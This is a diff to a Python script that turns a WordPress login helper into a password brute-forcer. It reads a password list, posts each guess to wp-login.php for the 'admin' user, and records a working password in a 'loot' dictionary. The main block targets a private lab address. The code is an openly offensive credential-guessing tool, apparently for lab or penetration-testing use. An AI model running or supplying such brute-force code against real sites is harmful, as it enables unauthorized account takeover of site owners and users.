@@ -2,12 +2,15 @@ from bs4 import BeautifulSoup
 import requests
 import time
 
+from filehandler import read_list
+
 
 class WordpressLogin:
     def __init__(self, target: str):
         self.target: str = target
         self.user = None
         self.password = None
+        self.loot: dict = {}
 
     def _get_params(self, content: bytes) -> dict:
         """An internal function to fetch parameters
@@ -33,24 +36,30 @@ class WordpressLogin:
         self,
         user: str | None = None,
         password: str | None = None,
-        wordlist: str | None = None,
+        passlist: str | None = None,
+        userlist: str | None = None,
     ):
+        loot = {}
         # create a list of given passwords + wordlist passwords
         passwords = []
         if password is not None:
             passwords.append(password)
-        elif wordlist is not None:
-            print("WORDLIST HERE PLEASE")
+        elif passlist is not None:
+            pwd = read_list(passlist)
+            passwords.extend(pwd)
         s = requests.Session()
         login_page = s.get(self.target)
         params = self._get_params(login_page.content)
         params["log"] = user
-        params["pwd"] = password
-        t = s.post(self.target, data=params)
-        if "Welcome to WordPress!" in t.text:
-            print("success")
+        for p in passwords:
+            params["pwd"] = p
+            t = s.post(self.target, data=params)
+            if "Welcome to WordPress!" in t.text:
+                self.loot[user] = p
+                break
+        return loot
 
 
 if __name__ == "__main__":
     test = WordpressLogin(target="http://10.1.1.39:8080/wp-login.php")
-    test.login_brute(user="admin", password="abc123")
+    test.login_brute(user="admin", passlist="wordlist/test.txt")
